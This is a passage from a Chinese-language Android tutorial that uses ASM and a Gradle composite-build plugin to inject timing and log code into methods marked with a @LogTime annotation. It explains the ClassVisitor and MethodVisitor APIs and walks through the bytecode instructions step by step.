    <span class="hljs-keyword">super</span>.visit(version, access, name, signature, superName, interfaces)

  }

  <span class="hljs-comment">// 当扫描到方法时，会调用这个回调</span>
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">visitMethod</span><span class="hljs-params">(access: <span class="hljs-type">Int</span>, name: <span class="hljs-type">String</span>?, descriptor: <span class="hljs-type">String</span>?, signature: <span class="hljs-type">String</span>?, exceptions: <span class="hljs-type">Array</span>&lt;<span class="hljs-type">out</span> <span class="hljs-type">String</span>&gt;?)</span></span>: MethodVisitor {
    <span class="hljs-keyword">val</span> originalMethodVisitor = <span class="hljs-keyword">super</span>.visitMethod(access, name, descriptor, signature, exceptions)
    <span class="hljs-keyword">if</span> (name == <span class="hljs-string">"add"</span>) {
      <span class="hljs-comment">// 如果是我们要修改的 add 方法，我们不能直接在这里写指令</span>
      <span class="hljs-comment">// 而是要返回一个新的 MethodVisitor 对象，由它去处理方法内部的细节</span>
      <span class="hljs-keyword">return</span> MyMethodVisitor(originalMethodVisitor)
    }

    <span class="hljs-keyword">return</span> originalMethodVisitor
  }
}
</code></pre>
<p>请注意 <code>ClassVisitor</code> 只负责“类”层面的事（比如类名、字段列表、方法列表）。当它发现一个方法时（<code>visitMethod()</code>），它不会直接处理方法体内的代码，而是要求你返回一个 <strong><code>MethodVisitor</code></strong>。也就是：如果你想改方法里的代码，得再派一个小弟（MethodVisitor）进去。这个 <code>MethodVisitor</code> 里的回调更加细致：</p>
<ul>
<li><code>visitAnnotation(descriptor: String, visible: Boolean)</code>：访问方法注解；</li>
<li><code>visitParameter(name: String, access: Int)</code>：访问方法的参数信息；</li>
<li><code>visitCode()</code>：方法体的开始；</li>
<li><code>visitVarInsn(opcode: Int, varIndex: Int)</code>：访问局部变量；</li>
<li>...</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMethodVisitor</span>(nextMv: MethodVisitor) : MethodVisitor(Opcodes.ASM9, nextMv) {
  <span class="hljs-comment">// 方法开始执行时</span>
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">visitCode</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">super</span>.visitCode()
    <span class="hljs-comment">// 插入：System.currentTimeMillis()...</span>
  }

  <span class="hljs-comment">// 遇到每条指令时</span>
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">visitInsn</span><span class="hljs-params">(opcode: <span class="hljs-type">Int</span>)</span></span> { 
    <span class="hljs-keyword">if</span> (opcode == Opcodes.IRETURN) {
      <span class="hljs-comment">// 在 return 之前插入耗时计算代码...</span>
    }
    <span class="hljs-keyword">super</span>.visitInsn(opcode)
  }
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/686d378473a34fa98f59320d09dd457f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=JoUXXicZRQ4oIjjVHfIADLK%2B3as%3D" alt="Core_API_Details.png" loading="lazy"/></p>
<p>相比于 Tree API，Core API 的优点是内存占用低、速度快。缺点就是实现复杂，有点反人类，作为开发者要时刻清楚当前“流”到了哪里。如果想获取上下文（比如在方法结尾想知道方法开头定义的某个变量值），得自己想办法用变量存起来，不像 Tree API 那样可以随意回头看。</p>
<p><strong>总结一下</strong>：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/274ffd9dc45548f5afab581e6b5b3388~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=9Q%2FunJYDrqHcKIuLxvLTJWHhUuE%3D" alt="Tree_VS_Core.png" loading="lazy"/></p>
<p>Tree API 就像是用 Word 打开文档，你可以随意翻页、查找、替换，适合做复杂的全类分析，但费内存； Core API 就像是听录音带，听一句改一句，过了就没了，适合做高效的机械化修改（比如统一加日志、埋点）。</p>
<h2 data-id="heading-12">实践</h2>
<p>我们从"插桩"和"AOP"这两个词开始讲起，然后简单了解了 Java 编译过程和 apk 打包流程，还学了点 JVM 字节码的知识，最后探讨了 ASM 是如何修改字节码的。</p>
<p>所有的理论知识都学了，接下来就是真刀真枪的实操环节了。我们来写一个 AOP 切面编程的 Hello World：函数耗时打印。</p>
<p>我们的目标很简单：给被注解的方法自动加上计时代码，并在 Logcat 中打印出来。</p>
<hr/>
<h3 data-id="heading-13">1. 定义标记：@LogTime</h3>
<p>我们先在 <code>:app</code> 模块新建一个注解类 <code>LogTime</code>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// app/src/main/java/com/example/aop/LogTime.kt</span>

<span class="hljs-meta">@Retention(AnnotationRetention.BINARY)</span> <span class="hljs-comment">// 重要：必须保留到字节码阶段，否则 ASM 读不到</span>
<span class="hljs-meta">@Target(AnnotationTarget.FUNCTION)</span> <span class="hljs-comment">// 作用在函数上</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogTime</span>()
</code></pre>
<p>然后，找个“受害者”方法。我们在 <code>MainActivity</code> 里写一个模拟耗时操作的方法，并打上标记：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// app/src/main/java/com/example/aop/MainActivity.kt</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">ComponentActivity</span>() {  
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {  
    <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)  
    doSomeHeavyWork()  
  }  
  
  <span class="hljs-meta">@LogTime</span> <span class="hljs-comment">// 打上标记</span>
  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">doSomeHeavyWork</span><span class="hljs-params">()</span></span> {  
    Thread.sleep(<span class="hljs-number">100</span>) <span class="hljs-comment">// 模拟耗时 100ms</span>
  }
}
</code></pre>
<p>如果不插桩，这段代码运行起来静悄悄的。我们的目标是让它自动吐出类似 <code>MainActivity.doSomeHeavyWork execution time: 100 ms</code> 的日志。</p>
<h3 data-id="heading-14">2. 搭建工程：Composite Build</h3>
<p>既然要对字节码下手，我们首先得搞清楚“战场”在哪。</p>
<p>普通的业务代码（比如 MainActivity）是运行在用户的 Android 手机上的；而我们现在要写的插桩代码，是用来修改字节码的，它需要运行在编译阶段（也就是你的开发电脑上）。</p>
<p>这意味着，我们不能把这部分代码直接写在 <code>:app</code> 模块里。我们需要一个能介入 Android 构建流程、在 <code>.class</code> 生成后由 Gradle 自动调用的东西——没错，就是 Gradle 插件。</p>
<hr/>
<p>Gradle 插件的代码必须独立于 <code>:app</code> 模块存在。在 Android 工程里，要存放这种“构建逻辑（Build Logic）”，通常有两个选择：</p>
<ul>
<li><code>:buildSrc</code>： 这是以前最常用的方案。只要在根目录新建一个叫 <code>buildSrc</code> 的文件夹，Gradle 就会自动把它识别为插件工程。
<ul>
<li>优点：零配置</li>
<li>缺点：<code>:buildSrc</code> 被视为构建脚本的一部分。只要改动了 <code>:buildSrc</code> 里的任何一行代码，Gradle 就会认为整个项目的构建逻辑变了，从而强制让所有模块（<code>:app</code>, <code>:lib</code>...）执行全量重新编译。</li>
</ul>
</li>
<li>Composite Build（复合构建）： 这是 Gradle 官方目前推荐的现代化方案。 它允许你把插件作为一个完全独立的项目（Project）来开发，然后通过 <code>includeBuild</code> 的方式“挂载”到主项目上。
<ul>
<li>优点：完全解耦。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de58daf9dae440b8a6e12ce8159f49d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnFsaWFuZw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558339&amp;x-signature=Ymv7KzGY3Jder%2FWBTcEhwtoYFT0%3D" alt="drop_buildSrc.png" loading="lazy"/></p>
<p>作为 2025 年的 Android 开发者，我们当然选择 Composite Build 来编写 Gradle 插件。</p>
<p>我们在项目根目录下新建一个文件夹 <code>build-logic</code>（名字可以随意），这就相当于我们创建了一个独立的“外包工程”。</p>
<p>就像我们创建 Android 项目一样，一个根项目里面包含一个 <code>:app</code> 模块，我们的外包工程项目（build-login）里面也应该有一个插件模块，所以我们再继续创建两级子目录 <code>/plugin/timing</code>，这个 <code>timing</code> 目录就是我们插件模块。</p>
<pre><code class="hljs language-diff" lang="diff">.
  ├── app/                   &lt;-- app 模块目录
  ├── gradle/
<span class="hljs-addition">+ ├── build-logic/           &lt;-- 复合构建的根目录</span>
<span class="hljs-addition">+ │   └── plugin/</span>
<span class="hljs-addition">+ │       └── timing/        &lt;-- 插件模块目录</span>
  ├── build.gradle.kts       &lt;-- 根项目的构建脚本
  └── settings.gradle.kts    &lt;-- 根项目的设置脚本
</code></pre>
<p>OK，我们创建了一个独立的"外包"工程项目，到目前为止，这个项目和主项目没有任何关联，我们需要在主项目 <code>settings.gradle.kts</code> 里使用 <code>includeBuild()</code> 告诉 Gradle：嘿，这个 <code>build-logic</code> 是一个独立的 Project，里面包含一些构建逻辑，在编译主项目里的任何模块之前，请你先编译 <code>build-logic</code> 这个项目。</p>
<pre><code class="hljs language-diff" lang="diff">// settings.gradle.kts

pluginManagement {  
<span class="hljs-addition">+  includeBuild("build-logic")</span>
   repositories { ... }  
}  
  
dependencyResolutionManagement { ... }  
  
rootProject.name = "AopExample"  
  
include(":app") // 包含 app 子模块
</code></pre>
<p>虽然复合构建（<code>build-logic</code>）从文件结构上看，存在于主项目内部，但是复合构建是可以被视为一个独立的 Project 的，也就是说，即使我把 <code>build-logic/</code> 文件夹单独拿出来，也可以 build 起来，不需要依赖主项目。既然它是一个独立的项目，那么应该有自己的 <code>settings.gradle.kts</code> 文件：</p>
<pre><code class="hljs language-diff" lang="diff">.
  ├── app/                     &lt;-- app 模块目录
  ├── gradle/
  ├── build-logic/             &lt;-- 复合构建的根目录
<span class="hljs-addition">+ │   ├── settings.gradle.kts  &lt;-- 管理 build-logic 内部的模块</span>
  │   └── plugin/
  │       └── timing/          &lt;-- 插件模块目录
  ├── build.gradle.kts         &lt;-- 根项目的构建脚本
  └── settings.gradle.kts      &lt;-- 根项目的设置脚本
</code></pre>
<p>内容和主项目的 <code>settings.gradle.kts</code> 是类似的：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build-logic/settings.gradle.kts</span>

pluginManagement {  
    repositories {  
        gradlePluginPortal()  
        google()  
    }  
}  
  
dependencyResolutionManagement {  
    repositories {  
        google {  
            content {  
                includeGroupByRegex(<span class="hljs-string">"com\\.android.*"</span>)  
                includeGroupByRegex(<span class="hljs-string">"com\\.google.*"</span>)  
                includeGroupByRegex(<span class="hljs-string">"androidx.*"</span>)  
            }  
        }  
        mavenCentral()  
    }
}  
  
rootProject.name = <span class="hljs-string">"build-logic"</span> <span class="hljs-comment">// 这个"外包工程"的名字</span>
include(<span class="hljs-string">":plugin:timing"</span>) <span class="hljs-comment">// 工程里包含的模块</span>
</code></pre>
<p>每个模块都有自己的 <code>build.gradle.kts</code> 文件，<code>:app</code> 如此，插件模块 <code>:plugin:timing</code> 也不例外：</p>
<pre><code class="hljs language-diff" lang="diff">.
  ├── app/                           &lt;-- app 模块目录
  ├── gradle/
  ├── build-logic/                   &lt;-- 复合构建的根目录
  │   ├── settings.gradle.kts        &lt;-- 管理 build-logic 内部的模块
  │   └── plugin/
  │       └── timing/                &lt;-- 插件模块目录
<span class="hljs-addition">+ │           └─── build.gradle.kts  &lt;-- 插件的构建脚本</span>
  ├── build.gradle.kts               &lt;-- 根项目的构建脚本
  └── settings.gradle.kts            &lt;-- 根项目的设置脚本
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build-logic/plugin/timing/build.gradle.kts</span>

plugins { `kotlin-dsl` }  
  
java {  
  sourceCompatibility = JavaVersion.VERSION_17  
  targetCompatibility = JavaVersion.VERSION_17  
}  
  
kotlin { compilerOptions { jvmTarget = JvmTarget.JVM_17 } }  
  
dependencies {  
  <span class="hljs-comment">// AGP API，用于访问 androidComponents 扩展</span>
  <span class="hljs-comment">// 强烈建议与 AGP gradle 版本保持一致</span>
  implementation(<span class="hljs-string">"com.android.tools.build:gradle-api:8.13.1"</span>)  
  <span class="hljs-comment">// ASM 核心库: 操作字节码的基础</span>
  implementation(<span class="hljs-string">"org.ow2.asm:asm:9.9"</span>)  
  <span class="hljs-comment">// ASM 工具库，提供了一些方便的适配器类  </span>
  implementation(<span class="hljs-string">"org.ow2.asm:asm-commons:9.9"</span>)  
}  

<span class="hljs-comment">// 注册 Gradle 插件</span>
<span class="hljs-comment">// TimingPlugin 我们在后面会实现</span>
gradlePlugin {  
  plugins {  
    register(<span class="hljs-string">"TimingPlugin"</span>) {  
      id = <span class="hljs-string">"timing-plugin"</span> <span class="hljs-comment">// 插件 ID</span>
      implementationClass = <span class="hljs-string">"com.example.asm.timing.TimingPlugin"</span> <span class="hljs-comment">// 插件的入口类</span>
    }  
  }  
}
</code></pre>
<h3 data-id="heading-15">3. 核心手术：编写 MethodVisitor</h3>
<p>好，架子搭好了，现在进入最核心的部分——写字节码。</p>
<p>我们要修改的是方法（Method），所以核心逻辑肯定在 <code>MethodVisitor</code> 里。</p>
<pre><code class="hljs language-diff" lang="diff">.
  ├── app/                           &lt;-- app 模块目录
  ├── gradle/
  ├── build-logic/                   &lt;-- 复合构建的根目录
  │   ├── settings.gradle.kts        &lt;-- 管理 build-logic 内部的模块
  │   └── plugin/
  │       └── timing/                &lt;-- 插件模块目录
  │           ├─── build.gradle.kts  &lt;-- 插件的构建脚本
<span class="hljs-addition">+ │           └── src/ </span>
<span class="hljs-addition">+ │               └── main/kotlin/com/example/asm/timing/ </span>
<span class="hljs-addition">+ │                   └── TimingMethodVisitor.kt</span>
  ├── build.gradle.kts               &lt;-- 根项目的构建脚本
  └── settings.gradle.kts            &lt;-- 根项目的设置脚本
</code></pre>
<p>直接用 <code>MethodVisitor</code> 会比较痛苦，还得自己判断哪里是方法结束。幸运的是，<code>asm-commons</code> 库提供了一个神器：<code>AdviceAdapter</code>，它是 <code>MethodVisitor</code> 的子类，贴心地提供了 <code>onMethodEnter()</code>（方法进入时）和 <code>onMethodExit()</code>（方法退出时）这两个回调。我们只需要在这两个地方“填空”就行了。</p>
<p>这部分代码稍微有点长，不过每一行都有注释，我就不啰嗦太多了，有了前面的前置知识，相信大家都能看懂，其实就是把 Java 代码“翻译”成等价的字节码指令。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build-logic/plugin/timing/src/main/kotlin/com/example/asm/timing/TimingMethodVisitor.kt</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TimingMethodVisitor</span>(  
    api: <span class="hljs-built_in">Int</span>,  
    methodVisitor: MethodVisitor,  
    access: <span class="hljs-built_in">Int</span>,  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> methodName: String?,  
    descriptor: String?,  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> className: String,  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> logTag: String  
) : AdviceAdapter(api, methodVisitor, access, methodName, descriptor) {  
  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> hasLogTimeAnnotation = <span class="hljs-literal">false</span>  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> startTimeLocalVarIndex: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>  
  
    <span class="hljs-comment">// 1. 访问方法的注解  </span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">visitAnnotation</span><span class="hljs-params">(descriptor: <span class="hljs-type">String</span>?, visible: <span class="hljs-type">Boolean</span>)</span></span>: AnnotationVisitor? {  
        <span class="hljs-keyword">if</span> (descriptor == <span class="hljs-string">"Lcom/example/aop/LogTime;"</span>) { <span class="hljs-comment">// 通过描述符判断注解  </span>
            hasLogTimeAnnotation = <span class="hljs-literal">true</span>  
        }  
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.visitAnnotation(descriptor, visible)  
    }  
  
    <span class="hljs-comment">// 2. 在方法进入时被调用  </span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onMethodEnter</span><span class="hljs-params">()</span></span> {  
        <span class="hljs-keyword">super</span>.onMethodEnter()  
        <span class="hljs-keyword">if</span> (hasLogTimeAnnotation) {  
            <span class="hljs-comment">// newLocal() 是一个便捷方法, 会在当前方法的局部变量表保留一个新的槽位, 返回局部变量索引  </span>
            startTimeLocalVarIndex = newLocal(Type.LONG_TYPE <span class="hljs-comment">/* 指定新局部变量的数据类型 */</span>)  
  
            <span class="hljs-comment">// 调用静态方法 System.currentTimeMillis()            // mv 是 MethodVisitor, 在父类中定义的  </span>
            mv.visitMethodInsn( <span class="hljs-comment">// visitMethodInsn 方法用于添加一个方法调用指令  </span>
                <span class="hljs-comment">/* opcode = */</span> INVOKESTATIC,      <span class="hljs-comment">// Invoke Static: JVM 字节码指令，它告诉 JVM 去调用一个 static（静态）方法  </span>
                <span class="hljs-comment">/* owner = */</span> <span class="hljs-string">"java/lang/System"</span>, <span class="hljs-comment">// 拥有该方法的类的内部名称  </span>
                <span class="hljs-comment">/* name = */</span> <span class="hljs-string">"currentTimeMillis"</span>, <span class="hljs-comment">// 想要调用的方法的名称  </span>
                <span class="hljs-comment">/* descriptor = */</span> <span class="hljs-string">"()J"</span>,         <span class="hljs-comment">// 方法描述符, () 表示该方法没有参数, J 表示方法的返回值类型是 long (J 是 long 的 JVM 类型签名)  </span>
                <span class="hljs-comment">/* isInterface = */</span> <span class="hljs-literal">false</span>         <span class="hljs-comment">// 指示 owner（即 java/lang/System）是否是一个接口  </span>
            )  
  
            <span class="hljs-comment">// 将上一步的结果（时间戳）存入我们之前创建的局部变量中  </span>
            mv.visitVarInsn( <span class="hljs-comment">// 此方法用于添加一个与局部变量交互的指令（如加载或存储）  </span>
                <span class="hljs-comment">/* opcode = */</span> LSTORE,        <span class="hljs-comment">// LSTORE 是一个复合指令: STORE 表示“存储”, 会从操作数栈的栈顶弹出一个值, L 表示 long                /* varIndex = */ startTimeLocalVarIndex // 局部变量索引, 指定要存储到哪一个局部变量槽位  </span>
            )  
        }  
    }  
  
    <span class="hljs-comment">// 3. 在方法退出时被调用 (无论是正常返回还是异常抛出)  </span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onMethodExit</span><span class="hljs-params">(opcode: <span class="hljs-type">Int</span>)</span></span> {  
        <span class="hljs-keyword">if</span> (hasLogTimeAnnotation) {  
            <span class="hljs-comment">/**  
             * 以下部分的等效代码是：  
             * long endTime = System.currentTimeMillis();  
             * long duration = endTime - startTime;             * String msg = new StringBuilder()  
             *         .append("MyClass.myMethod execution time: ")  
             *         .append(duration)             *         .append(" ms")             *         .toString();             * Log.d(logTag, msg);  
             */</span>  
            <span class="hljs-comment">// 再次调用 System.currentTimeMillis() 获取结束时间, 不再赘述  </span>
            mv.visitMethodInsn(INVOKESTATIC, <span class="hljs-string">"java/lang/System"</span>, <span class="hljs-string">"currentTimeMillis"</span>, <span class="hljs-string">"()J"</span>, <span class="hljs-literal">false</span>)  
            <span class="hljs-comment">// 加载方法开始时存储的时间戳  </span>
            mv.visitVarInsn(LLOAD, startTimeLocalVarIndex)  
            <span class="hljs-comment">// 计算差值 (结束时间 - 开始时间)  </span>
            mv.visitInsn(LSUB)  
            <span class="hljs-comment">// 将差值（long类型）存入一个新的局部变量  </span>
            <span class="hljs-keyword">val</span> durationLocalVarIndex = newLocal(Type.LONG_TYPE)  
            mv.visitVarInsn(LSTORE, durationLocalVarIndex)  
  
  
            <span class="hljs-comment">// 准备打印日志  </span>
            mv.visitLdcInsn(logTag) <span class="hljs-comment">// LDC (Load Constant) 加载一个常量到操作数栈的栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String)]  </span>
  
            mv.visitTypeInsn( <span class="hljs-comment">// 访问与“类型”相关的指令  </span>
                <span class="hljs-comment">/* opcode = */</span> NEW,                    <span class="hljs-comment">// NEW  </span>
                <span class="hljs-comment">/* type = */</span> <span class="hljs-string">"java/lang/StringBuilder"</span> <span class="hljs-comment">// 要创建的对象的类型  </span>
            ) <span class="hljs-comment">// 在堆上分配一个 StringBuilder 对象，并将其引用（地址）推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit)]  </span>
  
            mv.visitInsn(DUP) <span class="hljs-comment">// DUP (Duplicate) 复制栈顶元素  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit), sb_ref(uninit)]  </span>
  
            mv.visitMethodInsn(  
                <span class="hljs-comment">/* opcode = */</span> INVOKESPECIAL,            <span class="hljs-comment">// invoke special 特殊调用，用于构造函数、super 调用和 private 方法  </span>
                <span class="hljs-comment">/* owner = */</span> <span class="hljs-string">"java/lang/StringBuilder"</span>, <span class="hljs-comment">// 拥有该方法的类的内部名称  </span>
                <span class="hljs-comment">/* name = */</span> <span class="hljs-string">"&lt;init&gt;"</span>,                   <span class="hljs-comment">// 构造函数的固定名称  </span>
                <span class="hljs-comment">/* descriptor = */</span> <span class="hljs-string">"()V"</span>,                <span class="hljs-comment">// 描述符。() 表示无参数，V 表示 void 返回  </span>
                <span class="hljs-comment">/* isInterface = */</span> <span class="hljs-literal">false</span>                <span class="hljs-comment">// // 指示 owner（即 java/lang/StringBuilder）是否是一个接口  </span>
            )  
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit)]  </span>
  
            mv.visitLdcInsn(<span class="hljs-string">"<span class="hljs-variable">$className</span>.<span class="hljs-variable">$methodName</span> execution time: "</span>) <span class="hljs-comment">// 加载常量, 将日志消息的前缀（一个 String）推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit), 日志消息前缀(String)]  </span>
  
            mv.visitMethodInsn(  
                <span class="hljs-comment">/* opcode = */</span> INVOKEVIRTUAL,                                       <span class="hljs-comment">// invoke virtual: 虚拟调用，用于所有实例方法  </span>
                <span class="hljs-comment">/* owner = */</span> <span class="hljs-string">"java/lang/StringBuilder"</span>,                            <span class="hljs-comment">// 拥有该方法的类的内部名称  </span>
                <span class="hljs-comment">/* name = */</span> <span class="hljs-string">"append"</span>,                                              <span class="hljs-comment">// 方法名  </span>
                <span class="hljs-comment">/* descriptor = */</span> <span class="hljs-string">"(Ljava/lang/String;)Ljava/lang/StringBuilder;"</span>, <span class="hljs-comment">// 描述符, 参数类型为 String, 返回类型为 StringBuilder                /* isInterface = */ false                                           // 指示 owner（即 java/lang/StringBuilder）是否是一个接口  </span>
            ) <span class="hljs-comment">// 调用 append(String)。它会消耗栈顶的 日志消息前缀(String) 和 sb_ref(init), 不过它会返回一个 StringBuilder, 然后将结果推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit)]  </span>
  
            mv.visitVarInsn(LLOAD, durationLocalVarIndex) <span class="hljs-comment">// 加载耗时  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit), 耗时(long)]  </span>
  
            mv.visitMethodInsn(INVOKEVIRTUAL, <span class="hljs-string">"java/lang/StringBuilder"</span>, <span class="hljs-string">"append"</span>, <span class="hljs-string">"(J)Ljava/lang/StringBuilder;"</span>, <span class="hljs-literal">false</span>)  
            <span class="hljs-comment">// 调用 append(long)。它会消耗栈顶的 耗时(long) 和 sb_ref(init), 不过它仍然返回一个 StringBuilder, 然后将结果推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit)]  </span>
  
            mv.visitLdcInsn(<span class="hljs-string">" ms"</span>) <span class="hljs-comment">// 加载常量, 将日志消息的后缀（一个 String）推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit), 日志消息后缀(String)]  </span>
  
            mv.visitMethodInsn(INVOKEVIRTUAL, <span class="hljs-string">"java/lang/StringBuilder"</span>, <span class="hljs-string">"append"</span>, <span class="hljs-string">"(Ljava/lang/String;)Ljava/lang/StringBuilder;"</span>, <span class="hljs-literal">false</span>)  
            <span class="hljs-comment">// 调用 append(String)。它会消耗栈顶的 日志消息后缀(String) 和 sb_ref(init), 不过它仍然返回一个 StringBuilder, 然后将结果推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit)]  </span>
  
            mv.visitMethodInsn(INVOKEVIRTUAL, <span class="hljs-string">"java/lang/StringBuilder"</span>, <span class="hljs-string">"toString"</span>, <span class="hljs-string">"()Ljava/lang/String;"</span>, <span class="hljs-literal">false</span>)  
            <span class="hljs-comment">// 调用 toString()。它会消耗栈顶的 sb_ref(init), 然后将结果推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), 日志消息(String)]  </span>
  
            mv.visitMethodInsn(INVOKESTATIC, <span class="hljs-string">"android/util/Log"</span>, <span class="hljs-string">"d"</span>, <span class="hljs-string">"(Ljava/lang/String;Ljava/lang/String;)I"</span>, <span class="hljs-literal">false</span>)  
            <span class="hljs-comment">// 调用 Log.d(tag, msg)。它会消耗栈顶的 日志消息(String) 和 日志Tag(String), 然后将结果(写入的字节数)推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [result(int)]  </span>
  
            <span class="hljs-comment">// Log.d 返回了一个 int，我们并不关心它。如果不弹出它，这个 int 值会留在栈上，当原始的 RETURN 指令执行时，  </span>
            <span class="hljs-comment">// 会导致栈帧错误 (StackMapFrameError)。POP 用来清理栈，确保栈在我们的代码执行完毕后是干净的  </span>
            mv.visitInsn(POP) <span class="hljs-comment">// Log.d 返回 int，需要弹出  </span>
        }  
        <span class="hljs-keyword">super</span>.onMethodExit(opcode) <span class="hljs-comment">// 这行代码的作用是将原始的退出指令（如 RETURN）写回方法中, 不要忘记！！！  </span>
    }  
}
</code></pre>
<p>写这部分代码的时候，你可能会觉得自己就像一个无情堆栈机：“把这个压入栈，把那个弹出来……”。没错，这就是堆栈机的魅力（噩梦）。</p>
<h3 data-id="heading-16">4. 组装流水线：ClassVisitor 与 Factory</h3>
<p>有了处理方法的 <code>MethodVisitor</code>，我们需要一个“导游” <code>ClassVisitor</code> 来把各个方法领给它：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build-logic/plugin/timing/src/main/kotlin/com/example/asm/timing/TimingClassVisitor.kt</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TimingClassVisitor</span>(  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> apiVersion: <span class="hljs-built_in">Int</span>,  
    nextClassVisitor: ClassVisitor,  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> className: String,  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> logTag: String,  
) : ClassVisitor(apiVersion, nextClassVisitor) {  
  
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">visitMethod</span><span class="hljs-params">(  
      access: <span class="hljs-type">Int</span>,  
      name: <span class="hljs-type">String</span>?,  
      descriptor: <span class="hljs-type">String</span>?,  
      signature: <span class="hljs-type">String</span>?,  
      exceptions: <span class="hljs-type">Array</span>&lt;<span class="hljs-type">out</span> <span class="hljs-type">String</span>&gt;?,  
  )</span></span>: MethodVisitor {  
    <span class="hljs-comment">// 先获取原始的 MethodVisitor    </span>
    <span class="hljs-keyword">val</span> originalMethodVisitor = <span class="hljs-keyword">super</span>.visitMethod(access, name, descriptor, signature, exceptions)
    <span class="hljs-comment">// 用我们的 TimingMethodVisitor 包裹原始的 MethodVisitor</span>
    <span class="hljs-comment">// 这样，当 ASM 遍历指令时，会先经过我们的 MethodVisitor，再传给原始的 MethodVisitor</span>
    <span class="hljs-keyword">return</span> TimingMethodVisitor(  
        apiVersion,  
        originalMethodVisitor,  
        access,  
        name,  
        descriptor,  
        className,  
        logTag,  
    )  
  }  
}
</code></pre>
<p>就好比我们不能直接实例化 ViewModel，同样的，我们也不能直接创建 ClassVisitor，必须通过一个 Factory 工厂类来创建 ClassVisitor。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build-logic/plugin/timing/src/main/kotlin/com/example/asm/timing/TimingClassVisitorFactory.kt</span>

<span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimingClassVisitorFactory</span> :  
    <span class="hljs-type">AsmClassVisitorFactory</span>&lt;<span class="hljs-type">TimingClassVisitorFactory.Parameters</span>&gt; {
    <span class="hljs-comment">// 泛型用于指定这个工厂类可以接受的参数类型</span>
    <span class="hljs-comment">// 如果不需要接受参数，可以设置为 InstrumentationParameters.None</span>
  
  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Parameters</span> : <span class="hljs-type">InstrumentationParameters</span> {  
